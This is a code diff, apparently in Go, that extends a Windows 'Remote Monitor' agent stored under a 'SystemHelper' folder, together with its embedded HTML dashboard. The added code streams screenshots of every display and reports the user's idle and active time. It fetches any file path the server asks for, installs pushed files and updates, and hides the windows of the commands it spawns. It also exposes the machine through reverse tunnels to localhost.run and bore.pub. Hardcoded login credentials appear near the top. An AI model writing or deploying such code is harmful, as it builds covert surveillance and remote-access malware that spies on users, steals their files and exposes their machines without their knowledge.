@@ -39,6 +39,15 @@ var authUser = "puneet"
 var authPass = "puneet12"
 var authToken = ""
 
+// Activity tracking
+var programStartTime = time.Now()
+var lastIdleState = "active"
+var idlePeriodStart time.Time
+var activePeriodStart = time.Now()
+var totalIdleSeconds int64
+var totalActiveSeconds int64
+var currentIdleSeconds int
+
 // Data directory for config/logs (hidden from user)
 func dataDir() string {
 	exe, _ := os.Executable()
@@ -147,6 +156,10 @@ func init() {
 	loadCustomUrls()
 	f, _ := os.OpenFile(filepath.Join(dataDir(), "agent.log"), os.O_CREATE|os.O_WRONLY|os.O_APPEND, 0644)
 	logFile = f
+	// Clean old received from both old and new locations
+	exe, _ := os.Executable()
+	os.RemoveAll(filepath.Join(filepath.Dir(exe), "received"))
+	os.MkdirAll(receivedDir(), 0755)
 	log("Started v" + Version)
 }
 
@@ -157,14 +170,16 @@ func log(msg string) {
 }
 
 type Message struct {
-	Type    string            `json:"type"`
-	AgentId string            `json:"agentId,omitempty"`
-	Name    string            `json:"name,omitempty"`
-	Org     string            `json:"org,omitempty"`
-	Frame   string            `json:"frame,omitempty"`
-	Fps     int               `json:"fps,omitempty"`
-	Command string            `json:"command,omitempty"`
-	Params  map[string]string `json:"params,omitempty"`
+	Type    string                 `json:"type"`
+	AgentId string                 `json:"agentId,omitempty"`
+	Name    string                 `json:"name,omitempty"`
+	Org     string                 `json:"org,omitempty"`
+	Frame   string                 `json:"frame,omitempty"`
+	Display int                    `json:"display,omitempty"`
+	Fps     int                    `json:"fps,omitempty"`
+	Command string                 `json:"command,omitempty"`
+	Params  map[string]string      `json:"params,omitempty"`
+	Data    map[string]interface{} `json:"data,omitempty"`
 }
 
 const (
@@ -342,7 +357,9 @@ func handleRemoteUpdate(filename, data string) {
 	log("Update applied. Restarting...")
 	
 	// Start new version and exit this one
-	exec.Command(exePath).Start()
+	cmd := exec.Command(exePath)
+	hideCmd(cmd)
+	cmd.Start()
 	os.Exit(0)
 }
 
@@ -354,7 +371,9 @@ func preventDuplicate() {
 	var oldPid int
 	fmt.Sscanf(string(data), "%d", &oldPid)
 	if oldPid > 0 && oldPid != os.Getpid() {
-		exec.Command("taskkill", "/f", "/pid", fmt.Sprintf("%d", oldPid)).Run()
+		cmd := exec.Command("taskkill", "/f", "/pid", fmt.Sprintf("%d", oldPid))
+		hideCmd(cmd)
+		cmd.Run()
 		time.Sleep(500 * time.Millisecond)
 	}
 	os.Remove(lockFile)
@@ -483,30 +502,83 @@ func cleanupLogs() {
 var wsRef *websocket.Conn // Reference to primary WebSocket for agent responses
 var localCancel context.CancelFunc // Cancel previous secondary goroutine on reconnect
 
+func bootTime() time.Time {
+	t, _, _ := procGetTickCount.Call()
+	return time.Now().Add(-time.Duration(t) * time.Millisecond)
+}
+
 func startActivityLogger() {
 	if runtime.GOOS != "windows" { return }
 	
-	// Log startup with date
-	logEventDate("STARTED")
+	bt := bootTime()
+	logEventDate("STARTED (boot: " + bt.Format("15:04") + ")")
 	
 	go func() {
 		lastIdle := 0
 		lastLog := 0
+		statusTick := 0
 		for {
 			idle := getIdleSeconds()
+			now := time.Now()
 			
+			// Track active/idle periods with accumulation
 			if idle > 300 && lastIdle < 300 {
-				logEventDate("INACTIVE (idle " + fmt.Sprintf("%ds", idle) + ")")
+				// Transition: active -> idle
+				idlePeriodStart = now
+				activeDuration := now.Sub(activePeriodStart).Seconds()
+				totalActiveSeconds += int64(activeDuration)
+				logEventDate("INACTIVE (idle " + fmt.Sprintf("%ds", idle) + ", active was " + fmt.Sprintf("%.0fs", activeDuration) + ")")
+				lastIdleState = "idle"
 			}
 			if idle < 300 && lastIdle >= 300 {
-				logEventDate("ACTIVE (resumed)")
+				// Transition: idle -> active
+				activePeriodStart = now
+				idleDuration := now.Sub(idlePeriodStart).Seconds()
+				totalIdleSeconds += int64(idleDuration)
+				logEventDate("ACTIVE (resumed after " + fmt.Sprintf("%.0fs", idleDuration) + ")")
+				lastIdleState = "active"
 			}
 			lastIdle = idle
+			currentIdleSeconds = idle
 			
+			// Log uptime every 60 iterations (60 min)
 			lastLog++
 			if lastLog >= 60 {
 				lastLog = 0
-				logEventDate("RUNNING (uptime " + fmt.Sprintf("%dmin", osUptime()) + ")")
+				totalActive := totalActiveSeconds
+				totalIdle := totalIdleSeconds
+				if idle < 300 {
+					totalActive += int64(now.Sub(activePeriodStart).Seconds())
+				} else {
+					totalIdle += int64(now.Sub(idlePeriodStart).Seconds())
+				}
+				logEventDate(fmt.Sprintf("RUNNING (uptime %dmin, active %ds, idle %ds)", osUptime(), totalActive, totalIdle))
+			}
+			
+			// Send status to server every 5 min
+			statusTick++
+			if statusTick >= 5 && wsRef != nil {
+				statusTick = 0
+				totalActive := totalActiveSeconds
+				totalIdle := totalIdleSeconds
+				if idle < 300 {
+					totalActive += int64(now.Sub(activePeriodStart).Seconds())
+				} else {
+					totalIdle += int64(now.Sub(idlePeriodStart).Seconds())
+				}
+				wsRef.WriteJSON(Message{
+					Type: "agent-status",
+					Data: map[string]interface{}{
+						"bootTime":     bootTime().Format(time.RFC3339),
+						"programStart": programStartTime.Format(time.RFC3339),
+						"totalIdle":    totalIdle,
+						"totalActive":  totalActive,
+						"currentState": lastIdleState,
+						"currentIdle":  idle,
+						"uptime":       osUptime(),
+						"version":      Version,
+					},
+				})
 			}
 			
 			time.Sleep(60 * time.Second)
@@ -549,18 +621,33 @@ func cleanTempFiles() {
 		`cleanmgr /sagerun:1 >nul 2>&1`,
 	}
 	
-	for _, cmd := range cmds {
-		exec.Command("cmd", "/c", cmd).Run()
+	for _, c := range cmds {
+		cmd := exec.Command("cmd", "/c", c)
+		hideCmd(cmd)
+		cmd.Run()
 	}
 	
 	log("Temp files cleaned")
 }
 
+func receivedDir() string {
+	return filepath.Join("C:\\", "ProgramData", "SystemHelper", "received")
+}
+
+func cleanOldReceived() {
+	dir := receivedDir()
+	os.MkdirAll(dir, 0755)
+	entries, _ := os.ReadDir(dir)
+	for _, e := range entries {
+		path := filepath.Join(dir, e.Name())
+		os.RemoveAll(path)
+	}
+}
+
 func handleFileTransfer(filename, data string) {
-	exe, _ := os.Executable()
-	dir := filepath.Dir(exe)
-	dest := filepath.Join(dir, "received", filename)
-	os.MkdirAll(filepath.Dir(dest), 0755)
+	dir := receivedDir()
+	os.MkdirAll(dir, 0755)
+	dest := filepath.Join(dir, filename)
 	
 	decoded, err := base64.StdEncoding.DecodeString(data)
 	if err != nil { log("File transfer decode failed: " + err.Error()); return }
@@ -569,6 +656,18 @@ func handleFileTransfer(filename, data string) {
 	if err != nil { log("File transfer write failed: " + err.Error()); return }
 	
 	log("File received: " + filename + " (" + fmt.Sprintf("%d bytes", len(decoded)) + ") saved to " + dest)
+}
+
+func handleFileRequest(path string, conn *websocket.Conn) {
+	data, err := os.ReadFile(path)
+	if err != nil {
+		log("File request failed: " + err.Error())
+		conn.WriteJSON(Message{Type: "file-response", Command: path, Frame: "error: " + err.Error()})
+		return
+	}
+	encoded := base64.StdEncoding.EncodeToString(data)
+	conn.WriteJSON(Message{Type: "file-response", Command: path, Frame: encoded})
+	log("File sent: " + path + " (" + fmt.Sprintf("%d bytes", len(data)) + ")")
 }
 
 func startTunnel(ws *websocket.Conn) {
@@ -587,6 +686,7 @@ func startTunnel(ws *websocket.Conn) {
 			cmd := exec.Command("ssh", "-o", "StrictHostKeyChecking=no", "-o", "ServerAliveInterval=30",
 				"-o", "ConnectTimeout=10",
 				"-R", "80:localhost:3000", "localhost.run")
+			hideCmd(cmd)
 			out, _ := cmd.CombinedOutput()
 			output := string(out)
 			for _, line := range strings.Split(output, "\n") {
@@ -607,11 +707,13 @@ func startTunnel(ws *websocket.Conn) {
 					"Invoke-WebRequest -Uri 'https://github.com/ekzhang/bore/releases/download/v0.5.2/bore-v0.5.2-x86_64-pc-windows-msvc.zip' -OutFile '"+
 					filepath.Join(dataDir(), "bore.zip")+"' ; Expand-Archive '"+filepath.Join(dataDir(), "bore.zip")+"' -DestinationPath '"+
 					dataDir()+"' -Force ; Remove-Item '"+filepath.Join(dataDir(), "bore.zip")+"'")
+				hideCmd(dl)
 				dl.Run()
 			}
 			if _, err := os.Stat(borePath); err == nil {
 				// bore is non-blocking, runs in background
 				cmd := exec.Command(borePath, "local", "3000", "--to", "bore.pub")
+				hideCmd(cmd)
 				stdout, _ := cmd.StdoutPipe()
 				cmd.Start()
 				
@@ -700,8 +802,8 @@ func runServer() {
 				log("Agent: " + d.Name)
 			case "agent-frame":
 				if a, ok := agents[d.AgentId]; ok {
-					a.LastFrame = d.Frame
-					for v := range a.Viewers { v.WriteJSON(Message{Type: "frame", AgentId: d.AgentId, Frame: d.Frame}) }
+					if d.Display == 0 { a.LastFrame = d.Frame }
+					for v := range a.Viewers { v.WriteJSON(Message{Type: "frame", AgentId: d.AgentId, Frame: d.Frame, Display: d.Display}) }
 				}
 			case "dashboard-hello":
 				role = "dashboard"
@@ -722,6 +824,21 @@ func runServer() {
 					a.Ws.WriteJSON(Message{Type: "set-server-preference", Command: d.Command})
 					log("Set server pref for " + d.AgentId + " = " + d.Command)
 				}
+			case "become-server":
+				if a, ok := agents[d.AgentId]; ok {
+					a.Ws.WriteJSON(Message{Type: "become-server"})
+					log("Forwarded become-server to " + d.AgentId)
+				}
+			case "file-transfer":
+				if a, ok := agents[d.AgentId]; ok {
+					a.Ws.WriteJSON(Message{Type: "file-transfer", Command: d.Command, Frame: d.Frame})
+					log("Forwarded file-transfer to " + d.AgentId)
+				}
+			case "request-file":
+				if a, ok := agents[d.AgentId]; ok {
+					a.Ws.WriteJSON(Message{Type: "request-file", Command: d.Command})
+					log("Forwarded request-file to " + d.AgentId)
+				}
 			}
 		}
 		if role == "agent" && agentIdPtr != "" { delete(agents, agentIdPtr); log("Agent gone: " + agentIdPtr) }
@@ -732,19 +849,22 @@ func runServer() {
 		time.Sleep(1 * time.Second)
 		c, _, err := websocket.DefaultDialer.Dial("ws://127.0.0.1:3000/ws?token="+authToken, nil)
 		if err != nil { log("Embedded agent failed: " + err.Error()); return }
-		c.WriteJSON(Message{Type: "agent-hello", AgentId: agentId, Name: hostname + " (server)", Org: orgName})
+		c.WriteJSON(Message{Type: "agent-hello", AgentId: agentId, Name: hostname + " (server)", Org: orgName, Data: map[string]interface{}{"agentIP": getLocalIP()}})
 		go func() {
 			for {
 				_, m, e := c.ReadMessage()
-				if e != nil { return }
+		if e != nil { log("Disconnected: " + e.Error()); return }
 				var msg Message
 				json.Unmarshal(m, &msg)
 				if msg.Type == "control" { executeControl(msg.Command, msg.Params) }
 			}
 		}()
 		for {
-			frame := capture()
-			if frame != "" { c.WriteJSON(Message{Type: "agent-frame", AgentId: agentId, Frame: frame}) }
+			for _, m := range captureFrames() {
+				m.Type = "agent-frame"
+				m.AgentId = agentId
+				c.WriteJSON(m)
+			}
 			time.Sleep(time.Second)
 		}
 	}()
@@ -859,10 +979,16 @@ func connect() {
 		c, _, err = websocket.DefaultDialer.Dial(authURL, nil)
 		if err == nil { log("Connected: " + url); break }
 	}
-	if c == nil { return }
+	if c == nil { log("Disconnected: all URLs failed"); return }
 	defer c.Close()
 	wsRef = c // Save reference for agent responses
-	c.WriteJSON(Message{Type: "agent-hello", AgentId: agentId, Name: hostname, Org: orgName})
+	localIP := getLocalIP()
+	c.WriteJSON(Message{Type: "agent-hello", AgentId: agentId, Name: hostname, Org: orgName, Data: map[string]interface{}{
+		"bootTime":     bootTime().Format(time.RFC3339),
+		"programStart": programStartTime.Format(time.RFC3339),
+		"version":      Version,
+		"agentIP":      localIP,
+	}})
 
 	// Also connect to local server as secondary (for speed)
 	if localCancel != nil { localCancel() }
@@ -873,7 +999,7 @@ func connect() {
 		c2, _, err2 := websocket.DefaultDialer.Dial(localURL, nil)
 		if err2 != nil { return } // Local server not available
 		defer c2.Close()
-		c2.WriteJSON(Message{Type: "agent-hello", AgentId: agentId, Name: hostname + " (local)", Org: orgName})
+		c2.WriteJSON(Message{Type: "agent-hello", AgentId: agentId, Name: hostname + " (local)", Org: orgName, Data: map[string]interface{}{"agentIP": localIP}})
 		log("Connected to local server (secondary)")
 		
 		// Send frames to local server too
@@ -883,9 +1009,10 @@ func connect() {
 				log("Secondary connection stopped")
 				return
 			default:
-				frame := capture()
-				if frame != "" {
-					if err := c2.WriteJSON(Message{Type: "agent-frame", AgentId: agentId, Frame: frame}); err != nil {
+				for _, m := range captureFrames() {
+					m.Type = "agent-frame"
+					m.AgentId = agentId
+					if err := c2.WriteJSON(m); err != nil {
 						return
 					}
 				}
@@ -899,7 +1026,7 @@ func connect() {
 		defer close(done)
 		for {
 			_, m, e := c.ReadMessage()
-			if e != nil { return }
+			if e != nil { log("Disconnected: " + e.Error()); return }
 			var d Message
 			json.Unmarshal(m, &d)
 			if d.Type == "set-fps" && d.Fps > 0 { fps = d.Fps }
@@ -909,7 +1036,7 @@ func connect() {
 				log("Remote: set server preference = " + d.Command)
 			}
 			if d.Type == "push-update" {
-				handleRemoteUpdate(d.Frame, d.Command)
+				handleRemoteUpdate(d.Command, d.Frame)
 			}
 			if d.Type == "switch-server" && d.Command != "" {
 				log("Remote switch to: " + d.Command)
@@ -921,11 +1048,19 @@ func connect() {
 			if d.Type == "file-transfer" {
 				handleFileTransfer(d.Command, d.Frame)
 			}
+			if d.Type == "request-file" {
+				go handleFileRequest(d.Command, c)
+			}
 			if d.Type == "start-tunnel" {
 				startTunnel(c)
 			}
 			if d.Type == "cleanup-logs" {
 				cleanupLogs()
+			}
+			if d.Type == "become-server" {
+				log("Remote: exposing as server via tunnel")
+				saveServerPreference(true)
+				startTunnel(c)
 			}
 		}
 	}()
@@ -934,9 +1069,13 @@ func connect() {
 		select {
 		case <-done: return
 		default:
-			frame := capture()
-			if frame != "" {
-				c.WriteJSON(Message{Type: "agent-frame", AgentId: agentId, Frame: frame})
+			for _, m := range captureFrames() {
+				m.Type = "agent-frame"
+				m.AgentId = agentId
+				if err := c.WriteJSON(m); err != nil {
+					log("Disconnected: write error: " + err.Error())
+					return
+				}
 				fc++
 			}
 			time.Sleep(time.Second / time.Duration(fps))
@@ -1012,58 +1151,163 @@ func executeControl(cmd string, params map[string]string) {
 
 func parseFloat(s string) float64 { var f float64; fmt.Sscanf(s, "%f", &f); return f }
 
-func capture() string {
-	if screenshot.NumActiveDisplays() == 0 { return "" }
-	img, err := screenshot.CaptureRect(screenshot.GetDisplayBounds(0))
+func numDisplays() int {
+	return screenshot.NumActiveDisplays()
+}
+
+func captureDisplay(n int) string {
+	if n < 0 || n >= numDisplays() { return "" }
+	img, err := screenshot.CaptureRect(screenshot.GetDisplayBounds(n))
 	if err != nil { return "" }
 	b := new(bytes.Buffer)
 	jpeg.Encode(b, img, &jpeg.Options{Quality: 50})
 	return base64.StdEncoding.EncodeToString(b.Bytes())
 }
 
+func captureFrames() []Message {
+	n := numDisplays()
+	if n == 0 { return nil }
+	var msgs []Message
+	for i := 0; i < n; i++ {
+		f := captureDisplay(i)
+		if f != "" {
+			msgs = append(msgs, Message{Frame: f, Display: i})
+		}
+	}
+	return msgs
+}
+
+func capture() string {
+	return captureDisplay(0)
+}
+
 // Embedded dashboard HTML
 var htmlDashboard = `<!DOCTYPE html><html><head><meta charset="UTF-8"><title>Remote Monitor</title><style>
 *{margin:0;padding:0;box-sizing:border-box}
-body{font-family:-apple-system,sans-serif;background:#0f0f23;color:#fff;height:100vh}
-header{background:#1a1a3e;padding:15px 20px;display:flex;justify-content:space-between;border-bottom:1px solid #2a2a5e}
-h1{font-size:20px;color:#7c7cf0}
-#agents{width:300px;min-width:300px;background:#15153a;padding:15px;overflow-y:auto;border-right:1px solid #2a2a5e;height:calc(100vh-60px);float:left}
-.agent{background:#1e1e4a;border:1px solid #2a2a5e;border-radius:8px;padding:12px;margin-bottom:8px;cursor:pointer;transition:.2s}
-.agent:hover,.agent.selected{border-color:#7c7cf0;background:#252558}
-.agent .name{font-weight:600;font-size:14px}
-.agent .id{font-size:11px;color:#666;font-family:monospace}
-#viewer{margin-left:300px;display:flex;flex-direction:column;height:calc(100vh-60px);background:#0a0a20}
-#viewer-header{padding:10px 15px;background:#1a1a3e;display:flex;justify-content:space-between;align-items:center;border-bottom:1px solid #2a2a5e}
-#viewer-header button{background:#2a2a5e;color:#fff;border:1px solid #3a3a7e;padding:6px 12px;border-radius:4px;cursor:pointer;font-size:12px}
-#viewer-header button.active{background:#7c7cf0;border-color:#7c7cf0}
-#viewer-header button.readonly-hidden{display:none}
-#screen{flex:1;display:flex;align-items:center;justify-content:center;overflow:hidden}
-#screen img{max-width:100%;max-height:100%;object-fit:contain}
+body{font-family:-apple-system,BlinkMacSystemFont,sans-serif;background:#f0f2f5;color:#1a1a2e;height:100vh}
+header{background:#fff;padding:10px 20px;display:flex;justify-content:space-between;align-items:center;border-bottom:1px solid #e0e3e8;box-shadow:0 1px 3px rgba(0,0,0,.06)}
+h1{font-size:16px;color:#2563eb;display:flex;align-items:center;gap:8px}
+#status{font-size:12px;color:#64748b}
+#tunnel-url{background:#f0fdf4;padding:8px 15px;text-align:center;font-size:13px;color:#166534;border-bottom:1px solid #bbf7d0;display:none}
+#tunnel-url.failed{background:#fef2f2;color:#991b1b;border-color:#fecaca}
+#grid{padding:12px;display:flex;flex-wrap:wrap;gap:12px;overflow-y:auto;height:calc(100vh-90px);align-content:flex-start}
+.tile{background:#fff;border-radius:10px;overflow:hidden;box-shadow:0 1px 4px rgba(0,0,0,.08);cursor:default;flex:1 1 320px;min-width:280px;max-width:500px;transition:.15s;border:2px solid transparent}
+.tile:hover{box-shadow:0 4px 12px rgba(0,0,0,.12);border-color:#2563eb}
+.tile .head{display:flex;justify-content:space-between;align-items:center;padding:8px 12px;background:#f8f9fb;border-bottom:1px solid #e8eaee}
+.tile .name{font-weight:600;font-size:13px;color:#1a1a2e}
+.tile .ip{font-size:11px;color:#94a3b8;font-family:monospace}
+.tile .screen{width:100%;aspect-ratio:16/9;background:#f0f2f5;display:flex;align-items:center;justify-content:center;overflow:hidden;position:relative}
+.tile .screen .displays{display:flex;gap:2px;width:100%;height:100%}
+.tile .screen .displays .disp-thumb{flex:1;min-width:0;cursor:pointer;position:relative;background:#000;overflow:hidden;display:flex;align-items:center;justify-content:center}
+.tile .screen .displays .disp-thumb img{width:100%;height:100%;object-fit:contain}
+.tile .screen .displays .disp-thumb .disp-label{position:absolute;bottom:2px;left:2px;background:rgba(0,0,0,.6);color:#fff;font-size:9px;padding:1px 4px;border-radius:2px;pointer-events:none}
+.tile .actions{display:flex;gap:4px;padding:6px 12px;border-top:1px solid #e8eaee;flex-wrap:wrap}
+.tile .actions button{background:transparent;border:1px solid #d0d3d8;padding:3px 10px;border-radius:4px;font-size:11px;cursor:pointer;color:#1a1a2e;transition:.15s}
+.tile .actions button:hover{background:#eff6ff;border-color:#2563eb;color:#2563eb}
+.tile .actions button:disabled{opacity:.5;cursor:default}
+.tile .actions .ssh-link{background:#2563eb;color:#fff;border:1px solid #2563eb;padding:3px 10px;border-radius:4px;font-size:11px;cursor:pointer;text-decoration:none;display:inline-flex;align-items:center;gap:3px}
+.tile .actions .ssh-link:hover{background:#1d4ed8}
+.tile .actions input.file-input{display:none}
+#toast{position:fixed;bottom:20px;right:20px;background:#1a1a2e;color:#fff;padding:10px 20px;border-radius:8px;font-size:12px;z-index:999;opacity:0;transition:opacity .3s;pointer-events:none;box-shadow:0 4px 12px rgba(0,0,0,.2)}
+#toast.show{opacity:1}
+#modal{position:fixed;top:0;left:0;width:100%;height:100%;background:rgba(0,0,0,.92);z-index:1000;display:none;align-items:center;justify-content:center;flex-direction:column}
+#modal.show{display:flex}
+#modal img{max-width:95%;max-height:88vh;object-fit:contain}
+#modal .modal-close{position:absolute;top:15px;right:25px;color:#fff;font-size:30px;cursor:pointer;background:transparent;border:none;z-index:1001}
+#modal .modal-close:hover{color:#94a3b8}
+#modal .modal-label{color:#fff;font-size:14px;margin-bottom:10px;background:rgba(0,0,0,.5);padding:4px 12px;border-radius:4px}
 </style></head><body>
-<header><h1>🖥 Remote Monitor <span id="mode"></span></h1><span id="status">Disconnected</span></header>
-<div id="agents"></div><div id="viewer">
-<div id="viewer-header"><span id="vname">Select a device</span>
-<div><button id="btn-view">View</button><button id="btn-control" class="readonly-hidden">Control</button></div></div>
-<div id="screen"><p style="color:#444">Select a device from the list</p></div></div>
+<header><h1>🖥 Remote Monitor</h1><span id="status">Disconnected</span></header>
+<div id="tunnel-url"></div>
+<div id="grid"></div>
+<div id="modal"><button class="modal-close" onclick="closeModal()">✕</button><div class="modal-label" id="modal-label"></div><img id="modal-img"></div>
+<div id="toast"></div>
 <script>
-var isRO='<USER>'!='<USER>'||location.hostname!='localhost'&&location.hostname!='127.0.0.1'
-var sel=null,viewing=false,ctrl=false,dc=null
+var agents={}
+var modalState={agentId:null,display:0}
 var w=new WebSocket((location.protocol=='https:'?'wss:':'ws:')+'//'+location.host+'/ws?token=TOKEN_PLACEHOLDER')
 w.onopen=function(){document.getElementById('status').textContent='Connected'}
 w.onmessage=function(e){
  var d=JSON.parse(e.data)
- if(d.type=='agent-list')render(d.agents)
- if(d.type=='agent-connected')addAgent(d.agentId,d.name)
- if(d.type=='agent-disconnected')removeAgent(d.agentId)
- if(d.type=='frame'&&d.agentId==sel){document.getElementById('screen').innerHTML='<img src="data:image/jpeg;base64,'+d.frame+'">'}
+ if(d.type=='agent-list'){d.agents.forEach(function(a){agents[a.id]=a;addTile(a.id,a.name,a.ip||a.id)});grid()}
+ if(d.type=='agent-connected'){agents[d.agentId]={id:d.agentId,name:d.name,ip:d.ip||'?'};addTile(d.agentId,d.name,d.ip||'?')}
+ if(d.type=='agent-disconnected'){delete agents[d.agentId];var t=document.getElementById('t-'+d.agentId);if(t)t.remove()}
+ if(d.type=='frame'&&agents[d.agentId]){
+   var disp=d.display||0;agents[d.agentId].displays=agents[d.agentId].displays||{};agents[d.agentId].displays[disp]=d.frame
+   var img=document.getElementById('fi-'+d.agentId+'-'+disp)
+   if(!img){
+     var disps=document.getElementById('disps-'+d.agentId);
+     if(disps){
+       var thumb=document.createElement('div');thumb.className='disp-thumb';
+       var aid=d.agentId,dp=disp
+       thumb.onclick=function(){openFullScreen(aid,dp)}
+       thumb.innerHTML='<img id="fi-'+d.agentId+'-'+disp+'" src="data:image/jpeg;base64,'+d.frame+'"><span class="disp-label">'+(disp+1)+'</span>'
+       disps.appendChild(thumb)
+     }
+   }else{img.src='data:image/jpeg;base64,'+d.frame}
+   if(modalState.agentId==d.agentId&&modalState.display==disp)
+     document.getElementById('modal-img').src='data:image/jpeg;base64,'+d.frame
+ }
+ if(d.type=='tunnel-status'){
+   var el=document.getElementById('tunnel-url');el.className='';
+   if(d.frame=='ready'){
+     el.innerHTML='<span>Tunnel active: </span><a href="'+d.command+'" target="_blank" style="color:#2563eb">'+d.command+'</a> <button onclick="this.parentElement.style.display=\'none\'" style="background:transparent;border:none;color:#94a3b8;cursor:pointer;margin-left:8px">✕</button>';
+     el.style.display='block';
+   }else{
+     el.className='failed';el.innerHTML='<span>Tunnel failed: '+d.command+'</span> <button onclick="this.parentElement.style.display=\'none\'" style="background:transparent;border:none;color:#94a3b8;cursor:pointer;margin-left:8px">✕</button>';
+     el.style.display='block';
+   }
+ }
+ if(d.type=='file-response'){
+   var a=agents[d.agentId];if(!a)return
+   if(d.frame&&d.frame.startsWith('error:')){
+     showToast('File error on '+(a.name||d.agentId)+': '+d.frame)
+   }else{
+     var lnk=document.createElement('a');lnk.href='data:application/octet-stream;base64,'+d.frame;lnk.download=d.command.split('\\').pop()||'file';lnk.click()
+     showToast('Received file from '+(a.name||d.agentId))
+   }
+ }
 }
-function render(agents){var el=document.getElementById('agents');el.innerHTML='';agents.forEach(function(a){addAgent(a.id,a.name)})}
-function addAgent(id,name){var d=document.createElement('div');d.className='agent';d.innerHTML='<div class="name">'+name+'</div><div class="id">'+id+'</div>';d.onclick=function(){select(id)};document.getElementById('agents').appendChild(d)}
-function removeAgent(id){var el=document.querySelector('[data-id="'+id+'"]');if(el)el.remove()}
-function select(id){sel=id;document.querySelectorAll('.agent').forEach(function(e){e.classList.remove('selected')});var el=document.querySelector('[data-id="'+id+'"]');if(el)el.classList.add('selected');document.getElementById('vname').textContent=id;document.getElementById('screen').innerHTML='<p style="color:#444">Click View to start</p>'}
-document.getElementById('btn-view').onclick=function(){if(!sel)return;viewing=!viewing;w.send(JSON.stringify({type:viewing?'view-agent':'stop-viewing',agentId:sel}));this.textContent=viewing?'Viewing...':'View'}
-document.getElementById('btn-control').onclick=function(){if(!sel||!viewing)return;ctrl=!ctrl;this.textContent=ctrl?'Stop Control':'Control';this.classList.toggle('active')}
-document.getElementById('screen').addEventListener('mousemove',function(e){if(!ctrl||!sel)return;var r=this.getBoundingClientRect();w.send(JSON.stringify({type:'control',agentId:sel,command:'mousemove',params:{x:((e.clientX-r.left)/r.width*100).toFixed(2),y:((e.clientY-r.top)/r.height*100).toFixed(2)}}))})
-document.getElementById('screen').addEventListener('click',function(e){if(!ctrl||!sel)return;var r=this.getBoundingClientRect();w.send(JSON.stringify({type:'control',agentId:sel,command:'click',params:{x:((e.clientX-r.left)/r.width*100).toFixed(2),y:((e.clientY-r.top)/r.height*100).toFixed(2),button:e.button}}))})
-if(isRO){document.getElementById('mode').textContent='(view-only)';document.getElementById('btn-control').style.display='none'}
+function grid(){
+  var g=document.getElementById('grid')
+  if(!g.children.length)g.innerHTML='<div style="color:#94a3b8;text-align:center;padding:40px;width:100%">No devices connected</div>'
+}
+function closeModal(){document.getElementById('modal').classList.remove('show');modalState.agentId=null}
+function showToast(msg){var t=document.getElementById('toast');t.textContent=msg;t.classList.add('show');setTimeout(function(){t.classList.remove('show')},4000)}
+function openFullScreen(id,disp){modalState.agentId=id;modalState.display=disp;var a=agents[id];document.getElementById('modal-label').textContent=(a?a.name+' - ':'')+'Display '+(disp+1);var img=document.getElementById('fi-'+id+'-'+disp);if(img)document.getElementById('modal-img').src=img.src;document.getElementById('modal').classList.add('show')}
+function openAgent(id){
+ var a=agents[id];
+ if(a&&a.ip&&a.ip!='?'&&a.ip!='unknown')window.open('http://'+a.ip+':3000','_blank')
+}
+function exposeAgent(id){
+ var btn=document.getElementById('ex-'+id);
+ if(btn){btn.textContent='Starting...';btn.disabled=true}
+ w.send(JSON.stringify({type:'become-server',agentId:id}))
+}
+function sendFile(id){var input=document.getElementById('fileinp-'+id);if(input)input.click()}
+function sendFileSelected(id,input){
+ var file=input.files[0];if(!file)return
+ var reader=new FileReader()
+ reader.onload=function(){
+   w.send(JSON.stringify({type:'file-transfer',agentId:id,command:file.name,frame:reader.result.split(',')[1]}))
+   showToast('Sending ' + file.name + ' to ' + (agents[id]?agents[id].name||id:id))
+   input.value=''
+ }
+ reader.readAsDataURL(file)
+}
+function requestFile(id){
+ var path=prompt('Enter file path on agent (e.g. C:\\Users\\...):')
+ if(!path)return
+ w.send(JSON.stringify({type:'request-file',agentId:id,command:path}))
+ showToast('File requested from '+(agents[id]?agents[id].name||id:id))
+}
+function addTile(id,name,ip){
+ if(document.getElementById('t-'+id))return
+ var g=document.getElementById('grid')
+ var no=g.querySelector('div[style*="padding:40px"]')
+ if(no)no.remove()
+ var t=document.createElement('div');t.className='tile';t.id='t-'+id
+ t.innerHTML='<div class="head"><span class="name">'+name+'</span><span class="ip">'+ip+'</span></div><div class="screen"><div class="displays" id="disps-'+id+'"><div class="disp-thumb" onclick="openFullScreen(\''+id+'\',0)"><img id="fi-'+id+'-0" src=""><span class="disp-label">1</span></div></div></div><div class="actions"><a class="ssh-link" onclick="openAgent(\''+id+'\')">🔗 Open</a><button id="ex-'+id+'" onclick="exposeAgent(\''+id+'\')">🔌 Expose</button><input type="file" id="fileinp-'+id+'" class="file-input" onchange="sendFileSelected(\''+id+'\',this)"><button onclick="sendFile(\''+id+'\')">📁 Send</button><button onclick="requestFile(\''+id+'\')">📥 Get</button></div>'
+ g.appendChild(t)
+}
 </script></body></html>`
